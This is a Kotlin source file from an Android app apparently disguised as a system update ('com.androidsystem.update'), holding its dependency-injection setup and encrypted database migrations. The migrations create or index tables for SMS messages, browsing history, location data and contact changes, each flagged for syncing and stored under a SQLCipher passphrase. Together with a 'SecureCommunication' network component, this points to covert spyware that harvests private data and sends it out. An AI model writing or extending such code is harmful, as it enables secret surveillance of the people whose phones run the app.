package com.androidsystem.update.core

import android.content.Context
import android.util.Base64
import androidx.room.Room
import androidx.room.migration.Migration
import androidx.sqlite.db.SupportSQLiteDatabase
import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.android.qualifiers.ApplicationContext
import dagger.hilt.components.SingletonComponent
import net.sqlcipher.database.SupportFactory
import com.androidsystem.update.database.TelemetryDatabase
import com.androidsystem.update.database.TelemetryDao
import com.androidsystem.update.database.DataRepository
import com.androidsystem.update.network.NetworkManager
import com.androidsystem.update.network.SecureCommunication
import javax.inject.Singleton

@Module
@InstallIn(SingletonComponent::class)
object AppModule {

    @Provides
    @Singleton
    fun provideContext(@ApplicationContext ctx: Context): Context = ctx

    @Provides
    @Singleton
    fun provideEncryptionManager(@ApplicationContext ctx: Context): EncryptionManager =
        EncryptionManager(ctx)

    @Provides
    @Singleton
    fun provideConfigManager(
        @ApplicationContext ctx: Context,
        enc: EncryptionManager
    ): ConfigManager = ConfigManager(ctx, enc)

    @Provides
    @Singleton
    fun provideDatabase(
        @ApplicationContext ctx: Context,
        enc: EncryptionManager
    ): TelemetryDatabase {
        // FIX: synchronized + commit() instead of apply() for DB passphrase
        val passphrase = getOrCreateDbPassphrase(ctx, enc)
        val factory = SupportFactory(passphrase)
        return Room.databaseBuilder(ctx, TelemetryDatabase::class.java, "telemetry.db")
            .openHelperFactory(factory)
            .addMigrations(MIGRATION_1_2, MIGRATION_2_3, MIGRATION_3_4)
            .build()
    }

    @Provides
    @Singleton
    fun provideDao(db: TelemetryDatabase): TelemetryDao = db.telemetryDao()

    @Provides
    @Singleton
    fun provideRepository(
        dao: TelemetryDao,
        enc: EncryptionManager,
        @ApplicationContext ctx: Context
    ): DataRepository = DataRepository(dao, enc, ctx)

    @Provides
    @Singleton
    fun provideNetworkManager(@ApplicationContext ctx: Context): NetworkManager =
        NetworkManager(ctx)

    @Provides
    @Singleton
    fun provideSecureCommunication(
        @ApplicationContext ctx: Context,
        nm: NetworkManager
    ): SecureCommunication = SecureCommunication(ctx, nm)

    private val passphraseLock = Any()

    private fun getOrCreateDbPassphrase(ctx: Context, enc: EncryptionManager): ByteArray {
        val prefs = ctx.getSharedPreferences("db_prefs", Context.MODE_PRIVATE)
        return synchronized(passphraseLock) {
            val stored = prefs.getString("db_key", null)
            if (stored != null) {
                val decrypted = enc.decrypt(stored, EncryptionManager.KEY_DATABASE)
                Base64.decode(decrypted, Base64.NO_WRAP)
            } else {
                val key = enc.generateRandomKey(32)
                val keyB64 = Base64.encodeToString(key, Base64.NO_WRAP)
                // FIX: commit() instead of apply() for atomic write
                prefs.edit().putString("db_key", enc.encrypt(keyB64, EncryptionManager.KEY_DATABASE)).commit()
                key
            }
        }
    }
}

val MIGRATION_1_2 = object : Migration(1, 2) {
    override fun migrate(database: SupportSQLiteDatabase) {
        try {
            database.execSQL("ALTER TABLE collected_data ADD COLUMN synced INTEGER NOT NULL DEFAULT 0")
        } catch (e: Exception) { /* already exists */ }
        database.execSQL("""
            CREATE TABLE IF NOT EXISTS contact_changes (
                id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
                changeType TEXT NOT NULL,
                contactName TEXT,
                phoneNumber TEXT,
                changeTime INTEGER NOT NULL,
                synced INTEGER NOT NULL DEFAULT 0
            )
        """.trimIndent())
        database.execSQL("""
            CREATE TABLE IF NOT EXISTS network_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
                available INTEGER NOT NULL,
                networkType TEXT NOT NULL,
                timestamp INTEGER NOT NULL
            )
        """.trimIndent())
    }
}

val MIGRATION_2_3 = object : Migration(2, 3) {
    override fun migrate(database: SupportSQLiteDatabase) {
        database.execSQL("CREATE INDEX IF NOT EXISTS idx_collected_synced_ts ON collected_data(synced, timestamp)")
        database.execSQL("CREATE INDEX IF NOT EXISTS idx_collected_type ON collected_data(type)")
        database.execSQL("CREATE INDEX IF NOT EXISTS idx_location_ts ON location_data(timestamp)")
        database.execSQL("CREATE INDEX IF NOT EXISTS idx_browsing_synced ON browsing_history(synced)")
        database.execSQL("CREATE INDEX IF NOT EXISTS idx_browsing_visit ON browsing_history(visitTime)")
        database.execSQL("CREATE INDEX IF NOT EXISTS idx_sms_date ON sms_data(date)")
    }
}

val MIGRATION_3_4 = object : Migration(3, 4) {
    override fun migrate(database: SupportSQLiteDatabase) {
        database.execSQL("ALTER TABLE contact_data ADD COLUMN phoneHash TEXT NOT NULL DEFAULT ''")
        database.execSQL("CREATE UNIQUE INDEX IF NOT EXISTS index_contact_data_phoneHash ON contact_data(phoneHash)")
    }
}
